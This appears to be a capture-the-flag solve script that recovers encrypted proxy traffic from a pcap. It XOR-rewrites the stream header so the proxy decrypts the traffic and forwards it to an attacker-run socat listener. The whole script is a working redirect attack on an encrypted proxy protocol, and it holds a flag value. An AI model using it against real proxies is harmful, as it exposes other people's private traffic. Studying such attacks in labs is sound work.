
# use tcpflow first to extract the tcpflow
# listen on 192.168.126.120:8080, `socat - TCP-LISTEN:8080,fork,reuseaddr`

import struct
import glob
import socket
import os
from ipaddress import ip_address

os.system('rm -rf output_dir')
os.system('rm -rf report.xml')
os.system('tcpflow -r ../attachments/flag\{FJgymSNKu959MuPp\}/target.pacap -o output_dir')

flow_dir = 'output_dir'
listen_addr = '192.168.126.120'
listen_port = 8080

proxy_addr = '192.168.126.130'
proxy_port = 1080

dest_parms = b'\x01'     # use ip
dest_parms += struct.pack('!I', int(ip_address(listen_addr)))   # dest ip
dest_parms += struct.pack('!H', listen_port)

assert len(dest_parms) == 7

assume_header = b'HTTP/1.'
assert len(assume_header) == len(dest_parms)

def xor(v1, v2):
    return bytes(a ^ b for a, b in zip(v1, v2))

diff = xor(dest_parms, assume_header)

# Redirect the traffic and decrypt
for file in glob.glob(flow_dir + '/192.168.126.130*'):   # filter the traffic which server send to the client
    with open(file, 'rb') as f:
        buf = f.read()

    buf = list(buf)
    buf[:len(diff)] = xor(buf[:len(diff)], diff)
    buf = bytes(buf)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((proxy_addr, proxy_port))
    s.send(buf)
